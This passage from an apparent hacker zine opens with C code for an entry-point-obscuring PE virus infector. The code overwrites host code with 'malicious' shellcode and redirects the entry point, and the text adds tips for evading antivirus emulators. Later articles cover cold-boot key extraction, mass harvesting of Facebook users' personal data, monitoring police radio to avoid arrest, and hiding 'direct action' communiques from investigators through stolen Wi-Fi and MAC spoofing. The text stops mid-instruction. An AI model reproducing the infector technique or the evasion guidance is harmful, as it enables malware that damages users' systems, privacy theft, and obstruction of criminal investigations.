iOptHead->SizeOfImage=newsection->VirtualAddress+newsection->Misc.VirtualSize;
                                       // new image size
FileSize = newsection->PointerToRawData+newsection->SizeOfRawData;
                                     // physical offset + physicall size (EOF)
printf(""[+]Updated PE image...\n""); // copy original bytes to new section
DWORD NewSectionBackup_Addr = base+newsection->PointerToRawData; // new section
memcpy(NewSectionBackup_Addr,base+TargetRawAddr,sizeof(scode)+sizeof(jmpcode));
      // backup space that will be overwritten (malicious scode and jumper code)
printf(""[+]'Backed up' original data in new section...\n"");
memcpy(base+TargetRawAddr,&scode,sizeof(scode));         // write malicious code
printf(""[+] Wrote malicious code to target spot...\n"");
DWORD RestoreAddr = iOptHead->ImageBase+newsection->VirtualAddress+sizeof(scode)
+sizeof(jmpcode);             // address of restoration routine in new section,
                              // located after backup data

CreateJumper(jmpcode,RestoreAddr);             // ‘backup section' addr, points
     // to restoration routine
memcpy(base+TargetRawAddr+sizeof(scode),&jmpcode,sizeof(jmpcode));
                                       // copy jumper code after malicious code
printf(""[+]Created jumper code to restoration routine, appended it after
  malicious code...\n"");
CreateRestorationCode(restorecode,iOptHead->ImageBase+TargetRVA,
  iOptHead->ImageBase+newsection->VirtualAddress,sizeof(scode)+sizeof(jmpcode),
  iOptHead->ImageBase+iOptHead->AddressOfEntryPoint); // create restoration code
memcpy(base+newsection->PointerToRawData+sizeof(scode)+sizeof(jmpcode),
  &restorecode,sizeof(restorecode));
printf(""[+]Created restoration routine, appended it after backup data in new
  section...\n"");
iOptHead->AddressOfEntryPoint = TargetRVA;

There are of course many variations possible, we could for example leave the PE
entrypoint intact and insert a jump (with potential opaque-predicate based dummy
code to confuse emulators) to our piece of overwritten host code, we could also
locate the restoration routine inside the host body and make it self-restore.
Important would be to randomize the registers used in the jump code-linking.
Just, instead of 0xBF (mov edi) use another register, randomize this, it's
fairly easy. The same goes in this case for the jmp edi (0xFF 0xE7). 

Another idea might be to position our mal. code + jump BEFORE the entrypoint (if
there is space of course), leave the EP intact and insert a jump to this spot at
the entrypoint. Yet another idea might be to shatter the code over different
sections and link them together with jumps, creating code islands like z0mbie's
code in- tegration engine from Zmist.

There are many plays on this theme as you can see and although there are hordes
of things that could use some fixing / perfectioning, it does get you familiar
with the possibilities of EPO, and gives you a jump to de- signing your own
preferred methods. 

There are many plays on this theme as you can see and although there are hordes
of things that could use some fixing / perfectioning, it does get you familiar
with the possibilities of EPO, and gives you a jump to designing your own
preferred methods. 

[0x06]Resources:
http://msdn.microsoft.com/msdnmag/issues/02/02/PE/default.aspx
http://msdn2.microsoft.com/en-us/library/ms680195.aspx
""Appending to the PE File""      Lord Julus - 1999
http://vx.netlux.org/lib/static/vdat/tuappend.htm
""Entrypoint Obscuring""     GriYo
http://vx.netlux.org/lib/vgy01.html
""Fighting EPO viruses""     Piotr Bania
http://vx.netlux.org/lib/apb00.html

Shouts and greets go to the Nullsec folks ;) the whole of RRLF, the .aware crew,
xzziroz, PullThePlug, SmashTheStack, HackThisSite, the #dutch folks , #vxers and
#vx-lab on undernet, irc.blackhat.ru, what's left of 29A and every true blackhat
and scene lover out there, stick together guys!

################################################################################
 Full Disk Encryption Attacks                                       by HackBloc
################################################################################

If all your equipment was taken tomorrow what would someone be able to find out
about you? Think of all the data stored on old hard drives, CD / DVD ROMs, USB
keys and other media you might have around. All of this could be taken as
evidence by police or federal agents if your home were raided, and in all
probability you wont ever see it again. There are several techniques one could
implement that make it harder for them to recover any of your data. One of which
is disk encryption which we will be discussing in this article. 

There are two methods of encrypting your disks, you can either encrypt specific
files and folders or the entire disk. The problem with the former is that if an
attacker were to analyze your disk they will be able to see that certain parts
are encrypted and they will spend their time trying to crack that. It pretty
much paints targets on your encrypted files, that's not to say this technique is
useless, depending on the encryption algorithm it can still be very strong,
though it does allow more analysis of your machine including files that might
not be encrypted such as cookies, chat logs, operating system files and
temporary files. 

The other technique mentioned is encrypting your entire disk not just certain
parts. The benefit of this is that everything including the temporary files,
operating system files and meta data such as the file names and modification
timestamps are going to be encrypted as well, which will help to keep those
pesky federal agents out of all your secrets. Unless you had a few hundred
thousand years to spend cracking the encryption key your data will be secure.
Recently a team at Princeton University wrote a paper about how to extract the
encryption key from the RAM module and from this decrypt the entire disk. 

Most people think that when you shut off your computer the data stored in the
RAM is erased right away, this is not true. Due to what is called ""Memory
Remanence"" data stored in your RAM can exist with out decaying for minutes even
hours under the right conditions. This is bad news for those who are using disk
encryption. The problem here is that for the computer to be able to read what is
on your encrypted hard drive it needs to have access to the key, which is stored
in the RAM. As you can probably tell, if the data on the RAM is still there when
the machine is turned off, then the encryption key must also be there too. At
room temperature the quickest the RAM decayed to its default or ground state was
2.5 seconds, the longest being 35 seconds, it depends on your RAM, factors like
how new it is, make / model etc. The Princeton team did notice that regardless
of the type of RAM they all decayed with similar patterns. 

The Princeton University Team used cans of compressed air to cool the RAM to
approximately -50C while the machine was running. Their tests confirmed that at
these temperatures the RAM would retain its data for a much longer period of
time. In their tests they were able to keep 99.9% of the RAM intact without
power for up to 60 second. When the chips were placed in liquid nitrogen for an
hour they only experienced 0.17% data lose which would suggest that the RAM
could hold the data for hours if not days before decaying at these temperatures.

The image above is from the paper put out by Princeton University on the topic.
It shows how an image file decays after 5 seconds (left), the image is pretty
much the same as the original, the next is after 30 seconds, then 60 seconds,
and 5 minutes. If the attacker were forced to leave the RAM without power for
too long the data will become corrupted. You can lower the rate of corruption by
cooling the memory prior to cutting power, this will greatly decrease the amount
of data lose. Another method that The Princeton Team used is to apply algorithms
they developed to correct errors in both private and symmetric keys. So what you
have a very cold stick of RAM with an encryption key on it, what now? If you
have access to your target machine and its powered on, all you would need to do
is cold boot it by holding the power button or removing the power cord and
plugging it back in. Then the simplest method to get the keys off is to boot to
a USB key with a custom kernel on it, you need this kernel to leave only a very
very small footprint on the memory to prevent overwriting the key. Once you boot
to the USB key it would make image the RAM and copy this to itself allowing you
to extract the key from it at a later time. The Princeton team put a video of
this process on their website, the entire attack only took a few minutes and was
almost completely automated by the tools they created.

Another attack one could use is to again cut power to the machine, not turn it
off but cold boot it, then swap the DRAM module into another com- puter already
setup to image the chip. You would then continue the same way as before but this
time you are copying the image to the hard disk instead of a USB key. By using
this method you prevent the BIOS or other hardware the chance to clear the
memory while booting up. 

Once they had the data the Princeton team analyzed the image from the ram and
were able to extract the key. Even when some of the data on the chip had already
decayed they were still able to extract the key and com- plete the attack. On
their site they give a better explanation of finding and cracking the key, its a
little beyond the scope of this paper. 

Increasing the Life of the Data: If you were to hold a can of compressed air
upside down and spray it would come out as a very cold liquid instead of a gas,
the evaporation of the gas causes and additional chilling, by spraying this
directly on the memory module the Princeton team was able to cool the chip to
-50C and below. They were able to keep al- most all the data on the chip even
after it was out of the computer for several minutes. As mentioned above when
the chip was placed in liquid nitrogen it was able to keep almost all its data
without decaying for numer- ous hours. These attacks work against Apple's
FileVault, the BitLocker Drive Encryption feature included in the Enterprise and
Ultimate versions of Windows Vista, the open-source tool TrueCrypt, and the
dm-crypt module built into Linux kernels. 

These attacks prevent a risk to anyone who relies on disk encryption, even if
your machine is locked by a screen saver, or in some form of hibernation the key
can still be extracted. These do not provide any security. There are no easy
fixes to this problem at this time, the best method of preventing these attacks
is to shut your computer down completely before walking away from it, do not
walk away from it if your in a place where someone could potentially walk away
with it. These attacks are pretty advanced and require lots of technical
knowledge to use. If your just worried about a common thief stealing your
computer while you sit at a coffee shop, you disk encryption should keep your
secrets. If your worried about federal agents, NSA etc then you need to consider
the local security of the machine. 

################################################################################
 All Your Facebook Are Belong to Us                                 by Flatline
################################################################################

We all love communication, it is at the essential nature of humanity, we are
inherently social beings for the most part. In this Internet age social networks
have become an increasingly central way for people to communicate. Recently,
Facebook, one of the more popular social networks has released an API whereby
people can create applications that run within Facebook. This seems like a good
fun thing at first, but all those cute little applications that let you slap and
poke your friends, track football teams or share recipes with your friends have
a insidious underside. I am talking about the dual demons of marketing and
identity theft. Any application that you have added on Facebook is by default
allowed to access all the information on your profile through a very simple API.
Using this method I collected personal data on 100,000 people simply with a few
lines of code and a Facebook application that went viral. Here I will show you
how I dit it.

The first step is to write a Facebook application, the Facebook network has an
API or Application Programming Interface that is public. What this means is that
anyone who wants to can write an application that will hook into the Facebook
site and the Facebook database. The applications are primarily writ- ten in PHP
(although there are a large number written in Java, Ruby, Python and even C++).
How it works is, the application is written with calls to the Facebook API. Then
when a user visits your application via the Facebook website, Facebook uses a
technique called REST to request the application from your server and display it
via Facebook. The Facebook API offers a lot of features to the developer that
allow seamless interaction with the database and UI, but what we are interested
in is the API's ability to access the Facebook database. 

ACCESSING THE DATABASE
Once you have your application written and it has gotten quite large (100,000
users is a modest Facebook application, these things really do have a tendency
to go quite viral), it is time to start the information digging. Each Facebook
application can access many many stats on each user including but not limited to
Name, username, Gender, Sexual Preference, Religion, Political Preference, Age,
Geographic Location, Inter- ests, Facebook networks and a list of their Facebook
friends. How would one do this you might ask? Just a few simple lines of code: 

<code>
  <?php 
         /*This is the magic line! This line gets all the info we need, as you
can see right here I am only getting the birthday, gender, geographic location
and education level of the user, but I could get all of the things mentioned
above just as easily). This assumes that the user ID has been already stored in
the variable $user. */

$foo=$Facebook->api_client->sql_query(""SELECT birthday, sex, current_location,
education_history FROM user WHERE uid = $user"");
        
// Start the query
$query = ""INSERT INTO users_information (uid, sex, city, state, country, school,
birthday) VALUES (‘$uid', ‘$sex', ‘$city', ‘$state', ‘$country', ‘$school',
‘$birthday') ;
mysql_query($query);
  ?>
</code>

Just those simple lines of code was all it took me to get all the data on
100,000 Facebook users. Of course being a responsible citizen I promptly deleted
the data after I collected it, removed my application and de- leted my Facebook
account. But what if I was not a responsible citizen? I could have sold that
data to mar- keting companies such as double click or choice point. I could have
sold that data to identity theives or con artists or spammers to easily fool
people into loosing their money and livelihoods. I could have even sold that
data to government agencies intent upon mapping out social networks and
interests of people and cre- ating personality profiles for everyone in their
country. I can guarantee you with 100% certainty that people are doing all 3 of
those things as your read this article. I know because I have talked to them, I
have sat in conference rooms with them and stared into the eyes of the abyss. 

HOW CAN I PROTECT MYSELF
Well, the easiest and best thing you can do is delete your Facebook account
right now. I am serious, even if you add one application you can bet that your
data is being bought and sold, that is how these applications make money. Even
if you don't add an application you can bet that coders with no conscience will
be writing scripts to steal your information and map out your social networks.
Short of that, when you add a Facebook application you can select a box to not
allow it to access your personal information, but many applications wont allow
you to add them if you don't let them access your information.

Switching to myspace or orkut won't help either. To compete with Facebook they
are going to open up their API's to developers also, specifically both of those
networks will soon be using Google's ‘Open Social' API. I have done some
research into this API and I can tell you that the method of getting all of the
users data is almost exactly the same, and its just as easy. 

Alternatively you could just put a load of fake information up about yourself
including a fake name and fake pictures, but this still lets people identify
naturally occurring social networks. So the best bet is just not to create an
account on a social network at all. If you must, I recommend using Riseup.net's
Crabgrass social network written about in this issue of HackThisZine.

################################################################################
 Communication Systems and Technology
################################################################################

Technology
There is a great deal of communications technology available to us today. I'm
going to cover, very briefly, a few devices I think anarchists could use.

Scanners
Radio scanners are invaluable tools for gathering information that is being
broadcast by someone else. They work by scanning through a great number of
frequencies in a short amount of time looking for active broadcasts. When an
active broadcast is found, the scanner stops so the user can listen to it.

The FCC, the agency responsible for allocating radio frequencies for different
uses typically allocates a certain band, or group of frequencies, for each
technology. This means that if, for example, you wanted to listen to the
transmissions of air traffic controllers, you could get on the internet and find
out that the FCC has allocated the range of frequencies from about 960 MHz to
about 1215 MHz for that purpose. You could then use a scanner to search rapidly
between these frequencies, picking up any transmission that occurred. With the
right scanner, potentially connected to the right computer, you could listen in
on almost anything. 

For the purposes of this article, I'll focus on monitoring police frequencies.
Believe it or not, most police frequencies are broadcast in the clear for anyone
with a scanner to listen to. I guess it's done that way so reporters and
military veterans can listen in and feel up-to-date or something.

Getting Started
Scanning your local police department may be easier than you ever imagined. I
suggest going online and using google.com to search for local frequencies. Radio
hobbyists are a resourceful and charitable bunch, and they usually post the
frequencies they find on the internet. Another place you can find frequencies is
in books or magazines. Radio Shack carries a book that lists many of the police,
fire, and EMT frequencies in the country. If all else fails, you can usually
find police channels by scanning around, especially between 150Mhz and 160Mhz.
They're not difficult to recognize!

Once you have the frequencies, consult your scanner's manual (you did keep it,
right?). Depend- ing on your scanner, you should be able to program all the
police frequencies into a ‘bank' of frequencies, so as to scan only that bank.
If you can do this, you'll hear just the police frequencies. Next, you'll have
to adjust the squelch. What is that, you ask? Typically, there will be a knob on
your radio next to the volume knob. This is squelch. When you turn it all the
way down, you will hear that nasty radio noise you hear when your car radio
isn't turned to a station. Slowly turn up the squelch and the noise will go
away. This is a necessary step, because it adjusts your scanner for the amount
of noise that is in your area. If you don't do this, your radio won't be able
to dif- ferentiate between a real signal and mere noise. OK, now you're ready to
start scanning. 

When you first start scanning, the police may sound like they're speaking some
utterly unrecog- nizable dialect of English. Don't be put off, keep listening,
and things will start to make sense. The first thing you'll probably pick up on
is them running names, license plates, and so on. They'll broadcast full names,
birth dates, addresses, and social security numbers. You'll also start to
recognize when they're being dispatched, to which locations, and what for.
Sometimes an officer will even announce his home phone number right over the
air! The more you listen, the better you'll get at figuring out their jargon.

Tip: You may find that a key to the ‘police code', the jargon used on the air by
your local police department, is available for download off the internet.

Trunking
When looking for frequencies on the internet, you may find that the agency you
want to listen to uses a ‘trunk- ing' system. What the hell is that? The term
‘trunking' refers to a system that uses advanced technology to split up a
limited amount of radio frequencies. Imagine that the government of a large
city, say, Chicago, wants to set up a radio network. Chicago is a very big city
and has a great deal of communications needs. The Police Department, the Fire
Department, the Parks Department, the Water Department, the garbage collectors,
and many more all need to communicate, and many of these agencies will need to
use at least a few frequencies. This creates a problem, because radio
frequencies are not an abundant resource. Even a hundred or so fre- quencies
might be impossible to come by. So, someone figured out how to utilize fewer
frequencies for more activity. Most people using a radio aren't using it all or
even most of the time. Let's say that Chicago needs a hundred separate channels,
but they'll only use each channel about ten percent of the time. That means that
if there were a way to share frequencies, they could put all 100 channels on
only ten frequencies. This is what trunking does. 

When dealing with a trunking system, one is presented not with frequencies but
with ‘workgroups.' Every radio is assigned to a workgroup, and each workgroup
has a different purpose. The police, for example, might have five different
workgroups representing different districts. The system is controlled by a
computer that broadcasts a digital signal on its own frequency. Whenever someone
in a certain workgroup presses the button to broadcast something, the computer
assigns them a frequency to broadcast on and tells every other radio in that
workgroup to listen to that frequency. In use, the system is totally
transparent; it doesn't seem any different than using any other radio. 

What does this mean for you? First, if the agency you want to listen to uses a
trunking system, you will need a trunking scanner. There are several different
trunking systems, so before getting a scanner, figure out which kind you'll
need. The scanner I have can scan Motorola or EDACS trunked systems, which
account for almost all of them. You'll also have to read your manual and learn
how to program in the system you want to listen to. It's not that hard, I
promise! Also, if you're scanning around and hear a bunch of random tidbits that
don't relate to one another all on the same frequency, you're probably listening
to bits of a trunked system. 

A very small amount of agencies are now using ‘digital' trunking. I don't know
much about this yet, except that you have to get a really expensive scanner to
follow it. If your local department uses this, you might be shit out of luck.

If used properly, a scanner can keep you one step ahead of the police in the
streets. At a recent small-scale street protest in a little college town, we
used one to learn where police were setting up, how many of them there were,
and what their standing orders were. They even unknowingly helped us find the
local Starbucks and Army recruiting station! This allowed us to maneuver around
town without getting cornered, and to disperse before they were ordered to
arrest us. Not bad! 

FRS/GMRS Radio
I most frequently see people at protests attempting to communicate by means of
FRS (Family Radio Service) or GMRS(General Mobile Radio Service) walkie-talkies.
These radios are often available on the ‘optional payment plan' at department
stores, outdoor stores, WalMart, and so on. Though they are cheap or free, these
radios have severe limitations. 

The Family Radio Service is one of the ‘Citizen's Bands' designated by the FCC
to permit families and friends to communicate over short distances. You don't
have to have a license to use one. However, the FCC has severely limited the
output power on FRS radios, which means that at most they have only a one mile
range. In practice, this range is much shorter, especially in major cities where
there are many tall concrete buildings and other kinds of interference. My
humble opinion is that these radios are totally useless in any important
situation. They are simply not reliable, not to mention static-ridden. I've seen
FRS radios fail to communicate over a distance of only one block! 

The General Mobile Radio Service is a radio service specifically established by
the FCC ‘for short-distance two- way communications to facilitate the activities
of an adult individual and his or her immediate family members.' The regulations
allow for more powerful transmitters (1 to 5 watts), which means that GMRS
radios have a significantly greater range. These radios tend to be much higher
quality. However, in order to legally operate a GMRS radio, you must first
obtain a license from the FCC. I am still somewhat dubious about how effective
these radios can be in direct action, but they are definitely a much better
option than FRS radios. 

The operation of FRS and GMRS radios is basically the same, and usually very
simple. There is typically a small LCD screen that displays a number
prominently. This is the channel you're operating on. Everyone who wishes to
communicate together must set their walkie-talkie to the same frequency. Some
radios also have what is referred to as a ‘decoder' or ‘digital decoder.' If
your radio has this, a smaller number will appear next to the channel number.
This is the decoder number. A decoder allows your radio to filter out unwanted
transmissions by only letting those with the right decoder message through. If
you are communicating in a network that has some radios with decoders and some
without, those radios with decoders must set their decoder number to ‘0' in
order to be understood by the others. Check your manual to learn how to do this.
Channel: Each channel on a radio refers to a different frequency. Band: A band
is a range of frequencies. Tip: Only one person can broadcast on a radio
frequency at a time, so keep your transmissions brief, and don't try to talk
over anyone. Tip: When using a radio, speak calmly, and keep the microphone six
to twelve inches from your mouth. Talking too loudly or too close will turn your
transmission into a garbled mess. 

Amateur Radio Service (Ham Radio)
Ham radio is a service specified by the FCC to allow individuals solely with a
personal interest (as opposed to economic interest) to operate on several
different radio bands. The ham radio specification gives an operator a lot of
freedom as to the frequencies and equipment she can legally use.

The benefits of ham radio are extensive. The specification allows the use of
transmitters as powerful as 1000 watts in some cases! It also allows you to use
frequencies that are so low that their wavelength can be 10 or 20 or more meters
long. This means that the signal can travel extreme distances before fading.
People have often used ham radio to communicate with people halfway around the
world! You can even use ham radio to bounce a signal off satellites or the moon. 

Like any thing else, though, ham radio has its downsides. For one, legally, you
have to be licensed to operate a ham radio. Also, the equipment can be
relatively expensive and difficult to obtain. It can also be a bit more
complicated to operate. 

The licensing process for ham radio is pretty straightforward. Local ham radio
hobby groups sponsor testing all over the country. You can find out where the
nearest test is being given at www.arrl.org. To study for the test, I recommend
finding a copy of Now You're Talking! This book covers everything you need to
know for the test. Honestly though, the test is very easy. If you're pressed for
time, consider just reading through the questions in the back of the book: these
include every possible question that could be given on the exam.

First, you'll want to take the ‘Technician' exam. This will give you access to
the most popular ham radio bands. If you get really interested, you might
consider taking the ‘Tech Plus' (for which you'll need to learn Morse code),
‘General,' or ‘Extra' exams, each of which offers added privileges. Another
reason to own a ham radio license is that it often gives you the right to carry
a scanner on the street. Many states have ordinances pro- hibiting this, but
they usually have exceptions for licensed amateurs.

Ham radios have a great deal of potential for our purposes. There are many
handheld ham radios available that would be perfect for use in the streets.
Because these radios are relatively small, they are usually limited to only 5 or
6 watts, which is relatively low. However, amateur hobbyists have set up a
network of ‘repeaters' all over the country that allow you to extend the range
of your radio. Essentially, a repeater is a station that receives broadcasts on
one frequency, and then rebroadcasts them on a slightly different one; for
example, a repeater could pick up a transmission from a relatively weak handheld
radio and rebroadcast it at a few hundred watts or more. Suddenly, the range of
that relatively weak handheld becomes immense. Imagine a comms team able to
communicate not only throughout a whole city, but an entire region! 

All in all, I think ham radio is a valuable resource. I find it to be a much
better option than FRS or GMRS for anyone that can acquire the technology and
take the time to get the license.

Remember: Any transmission that goes out over radio waves can and will be heard
by the authorities.

SMS Text Messaging
For anyone that's been living in a cave recently, I'm envious. But you may not
have heard about this wonderful technology! SMS text messaging is the same thing
that people all over the place are using to send little notes back and forth
between cell phones. Basically, it's a protocol that allows people to send
simple plain-text messages to each other via wireless devices.

SMS doesn't just work on cell phones either. You can also receive messages with
an alphanumeric pager. They've even created little two-way pagers that have a
full keyboard so you can receive and respond to text messages.

A corporate defector I know grabbed a few of these two-way pagers for me once.
They turned out to be very useful. Messages came in without any possible loss of
clarity. They worked almost anywhere, and you could respond quickly. I'm not
sure how much the service cost because a major investment firm was paying for
mine, but I've heard that it's somewhere between $10 and $20 a month.

The recent release of txtmob.com really established text messaging as a tactical
tool. Txtmob.com is the brainchild of those lovely people over at the institute
of applied autonomy (appliedautonomy.com). Essentially, the service acts like an
email list. People subscribe to a group, and messages sent to the group get
rebroadcast to everyone else in the group. Just like an email list, a txtmob
group can be invite-only or open for anyone to join, and it can be moderated
(only one person can send messages to the group) or unmoderated (anyone can send
to the group). Txtmob was created for use during the Democratic National
Convention protests in Boston. It was used by the Indymedia collective to
rebroadcast reports as they received them. In this way people were sent timely
and clear information regarding the activities of police and protesters in the
streets.

I find this technology to be one of the most promising to protesters in the next
few years. To begin with, SMS enable devices are all over the place, many people
have SMS enable cell-phones, and pagers are pretty cheap. SMS can enable a large
number of people to communicate almost simul- taneously and with little risk of
distortion or confusion. In addition, SMS devices are almost always in signal
range, and messages can be broad- cast across the country. 

Putting It All Together I can already hear you squirming impatiently in your
seat, dear reader. You're saying, ‘The technology's all fine and good, but how
can we use it to form effective comms teams'? In all honesty, I'm not a hundred
percent sure. I have yet to operate with a comms team that worked to my complete
satisfaction. However, I do have some good tips about using comms, and some
ideas as to what a really good comms team might look like.

Comms Team Structure The most important step in forming a solid communications
infrastructure for an action is getting right people for the job. Those
participating in a comms team should, ideally, be cool, calm, and quick-witted.
There are many roles individuals can play, and it's important to match the right
person to each one.

The most visible member of the comms team is the scout. Scouts are primarily
useful in a mass-protest or march situation. It is their job to collect
information about the movements of the police or any other po- tential threat to
the action actually occurring. Scouts should make efforts to make themselves
hard to spot and hard to capture. To this end, I've used two basic approaches:
bicycles and disguises. Bicycles are great for scouts because they allow them to
move very quickly about a large area. A quick and experienced bicyclist is also
very difficult to stop and arrest. Disguise is a more effective technique if the
group needs continu- ous updates on or from a given location. In the past, I've
scouted an area by donning a nice suit and drinking coffee on a patio of
interest. No one thinks twice about a ‘business person' drinking coffee and
talking on a cell phone or typing on a laptop. 

Tip: Don't use too many codes. In a stressful situation, militants will be hard-
pressed to remember the meaning of codes they're supposed to use on air, and the
quality of communication will deteriorate. 

I believe a solid comms group should also include someone whose sole job is to
monitor police transmissions. In some cases, it is actually beneficial to have
several people doing this. I say this because a person can only listen in on one
transmission at a time, but in a mass-protest situation there will likely be
lots of police transmissions occurring simultaneously. It would be the duty of
those filling this role to report back on any announced police strategies,
movements, arrests, standing orders, and so on. 

Scouts and radio monitors will, in many circumstances, be generating a great
deal of information, too much, perhaps, to make any sense to the great majority
of people participating in the action. For this reason, I be- lieve that it can
be necessary to have several people whose task it is to sort through the
information, pick out the pertinent parts, and re-broadcast these to the masses.
Perhaps we could call these people the vanguard! Seriously though, I do think
that some situations might warrant a small level of centralization in this
regard. Individuals occupying this position could make sure that important
information is relayed by as many types of media as possible: e.g., radio, text
messaging, cell phone calls, and so on. They could also find and dis- seminate
crucial logistical data, such as potential alternate routes, by looking at
street maps, sewer maps, and such. 

At the protests against the World Bank that occurred in Prague late in 2000,
there was an information clearinghouse in the form of a room with several
telephones operated by people equipped with maps. They received constant updates
as events developed, and plotted the movements of police and protesters on these
maps; they also took phone calls from demonstrators in need of this information.
By many accounts, this service was critical to the success of the protests. Of
course, your comms team may find it handy to have a tech-geek around. (I
volunteer!) This person could make sure that the radios are working right, the
scanners are programmed, the txtmob list is set up, the repeaters are functional
and so forth. 

You can make a radio repeater very simply with two radios. A repeater receives a
signal on one channel, and rebroadcasts it on another; this is handy for
increasing the range of a radio signal, or for allowing someone to hear the same
signal on several different bands, for example, you could pick up a ham radio
signal and rebroadcast it on a GMRS frequency. 

To do this, you need a radio capable of receiving the signal in question, and
another radio capable of broadcast- ing on the desired output frequency. You'll
need to take these radios to an electronics store and find a cable or an adapter
that allows you to connect the headphone (output) jack of the receiver to the
microphone (input) jack of the transmitter. Connect the two devices. Depending
on your output radio, you may need to turn on ‘vox' or ‘accessory vox.' You may
need to fiddle around with it, but it should work just like that. 

################################################################################
 Anonymity with Wireless Networking                                   by IMPACT
################################################################################

INTRODUCTION
Somewhere in this country right now there is an FBI branch office, and in this
office is a cluttered desk, and on this desk is an investigation manual, and in
this manual is a chapter entitled ""Investigating Political Crimes."" And the
first thing this section says is ""Track the communique.""

Since perhaps the inception of direct action militants have composed and
released, by various means, statements explaining their action. These
communiques, which are of the utmost importance to a campaign of ""propaganda by
the deed,"" can be dangerous, and have often turned out to be the fatal stumbling
block in what might have otherwise been an ingeniously conceived of and executed
plan of action. The communique often serves as the state's first piece of
evidence that directly connects back to the individuals involved in the crime
under investigation. Because of this, the DA enthusiast must be extremely
cautious with communiques lest her words of inspiration to the masses become her
downfall. 

Over time, the method by which communiques have been delivered has varied.
Perhaps the first one was carved into the body of a fallen crusader and
catapulted over a castle wall. Who's to say? As time went on, new technologies
provided new opportunities and risks for dissidents to get their message out.
The Internet is the most obvious modern instance of this trend.          

The Internet offers many advantages to agents in the field (which is to say our
agents in the field). Most obvi- ously relevant are the internet's capability of
reaching such a large amount of people in such short time and a the sense of
anonymity that it provides. It is this sense of anonymity that has caused
trouble for some. In this article I plan on explaining why this sense of
anonymity is little more than an illusion, and then go on to show how - like
many illusions - this one can be made real with a little effort. 

IP ADDRESSES
Each time we open a web browser and type in an address we're asking our computer
to contact another com- puter and retrieve certain information. It's like
getting in a cab and saying ""Take me to Barthélemy's Bar."" In order to actually
get to the bar though, the cab driver has to process this information into
something actu- ally usable such as an address, or intersection. Your computer
does the same thing, it translates the domain name you typed in into what is
referred to as an IP address. Every computer connected to the Internet has an IP
address. An IP Address is a set of four numbers ranging from 0 to 255 separated
by decimal points, eg. 64.128.0.14. Think of this like the street number
attached to your house or your telephone number. Unlike street addresses and
phone numbers, though, your IP addresses can change, and will typically do so
often. 

Every time you visit a web site, send out an e-mail, or do some other task
online, the IP Address your comput- er is using is logged. Even though this
number might not be your number in the sense that your phone number is your
number, it can still be traced to you. If, for example, you were using a dialup
or broadband Internet account with someone's name attached to it, then the
Internet Service Provider can determine whose account the address was attached
to at the time you visited the site. Even if you use a publicly accessible
computer, your activities can be traced. 

Let's say, for example, an anarchist writes a communique on a computer at a
public library. This library is a little less conservative than most these days
and doesn't require users to log in with an ID or library card. So, the
anarchist in question thinks she's free and clear. She is, of course mistaken.
The first thing the Feds would do is find the IP Address of the computer that
sent the email, or posted the message on a message board or whatever (this is a
trivial task). Next, they would check publicly available records and find out
that the IP Ad- dress is owned by the library in question. The Feds would then
go to the library and ask their computer techni- cians which library terminal
was using the IP Address in question at the specified time. With this
information the Feds would probably proceed to confiscate and fingerprint the
equipment, and check any video surveillance to determine who was using the
terminal at the time. It may be that the Feds get nothing from this information,
but did our anarchist really need to take that risk? 

Luckily, there are better ways. One of these came with the advent and
proliferation of wireless networks. They're everywhere these days, in homes,
cafes, corporate offices, anywhere you can think of. Many of these networks are
totally wide open for the public to use.

Using a wireless network offers some strategic advantages to someone seeking
anonymity on-line. First, because the user is not bound by wiring, they can be
physically distant from the actual internet connection. Right now, for example,
the author is using a home-made antenna to covertly steal internet access from
the neighbor down the street. An additional benefit comes from the network
architecture typically used in a wireless network. Remember how I said an IP
Address consists of four numbers ranging from 0 to 255? Well, this means that
there are a limited number of IP Addresses available. Considering that the
internet is a world- wide resource, this number is actually relatively low.
Because of this fact, a system was developed whereby multiple computers could
share one IP Address. For the record this is known as Network Address
Translation. A system set up with NAT consists of a computer that has a real IP
Address, known as the server, and a number of computers that have fake
addresses, known as the clients (these addresses tend to be 10.x.x.x or
192.168.1.x; where ‘x' is a number 0 - 255, but they need not be). The server
receives requests for internet content from the clients and then requests that
information from the internet, when the internet responds with the requested
content, the client determines which client asked for it, and then sends it to
that computer. The important thing to note is that any client under such a
system has no unique IP Address, and most wireless networks use this kind of
setup! 

So, let's revise our example above. This time the anarchist uses a laptop to
access an unprotected wireless network made available by a public library. In
order to avoid suspicion and detection she accesses the network from a bench
well out of site of surveillance cameras in the public park next to the library.
When the Feds get wind of it, they will, once again, be able to trace the
communications to the library. This time, however, the library's computer
technicians won't be able to tell the feds much because they have a publicly
available wire- less network, and the feds will gain little from surveillance
footage. Quite an Improvement! 

MAC ADDRESSES
Alas, this second scenario is still not good enough. That is because of a
nefarious little piece of information known as the Media Access Controller
Address, or MAC Address. The MAC Address - sometimes referred to as the Network
Address or Physical Address - is a number that is intended to uniquely identify
the piece of hard- ware you are using to connect to a network. If an IP Address
were the license plates on a car, then the MAC Address would be the VIN number.
Every piece of network hardware, including your wireless adapter, has a MAC
address, and unlike an IP Address, this unique identifier is passed on and
recorded even across a network using NAT. Luckily, it is nearly impossible to
track a known MAC Address to the person that owns that piece of hardware. It is
possible, however, for an investigator to compare a known MAC Address to the MAC
Address on any Network Interface Cards a suspect might own. 

So, in the example I just gave, our anarchist may not get off altogether. Since
the author of the communi- que made no effort to conceal her MAC Address, the
feds will learn it. Let's say that our protagonist lives in a relatively small
town, and is known to belong to a small community of anarchists there. Our
anarchist may come under suspicion for the actions claimed in the communique
just by virtue of already being on the law enforcement's radar. If this is the
case, the investigators are likely to confiscate this person's computer and
check the MAC Address to the one used to issue the communique. When they find
that they are a match, our friend could get in some serious trouble. All is not
lost though, with a bit of knowledge and practice, one can learn to hide their
MAC Address. 

HIDING ONE'S MAC ADDRESS IN WINDOWS XP
The process for changing one's MAC Address in windows is relatively straight-
forward, but first-timers and/or those intimidated by computers may find the
process baffling at first. I urge you, the reader, to look over these step-by-
step instructions and their accompanying diagrams several times. After you think
you have it down, be sure to practice a few times before you need to do it in a
""real-world"" situation. 

Step 1: To give you a feel of what we're going to do, go to Start->
        Programs-> Accessories-> Command Prompt. A box with some text and a
        blinking cursor should come up. Type this command ipconfig /all. You get
        a bunch of information regarding your network connections. Somewhere in
        this information will be a line that reads ""Physical Address..."" (See
        figure 1). This is your current MAC Address, write it down for
        reference. It will be a series of 6 numbers represented in hexadecimal
        format (this means that a digit can be 0 through 9 or a through f where
        a through f represent 10 through 15). Our goal is to replace these
        numbers with different ones. In order to do this we need to edit the
        registry. 

Step 2: The registry is a repository of data that is used by the operating
